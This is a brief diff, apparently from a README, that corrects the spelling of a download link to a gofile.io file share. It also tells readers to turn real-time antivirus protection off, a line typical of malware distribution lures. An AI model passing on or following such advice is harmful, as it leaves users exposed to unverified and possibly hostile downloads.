@@ -9,5 +9,5 @@ had to share it as a link because its more than 25mb
 
 Dont forget To Turn Real Time Protection OFF !
 
-Download linl : https://gofile.io/d/9rdjLp
+Download link : https://gofile.io/d/9rdjLp
 
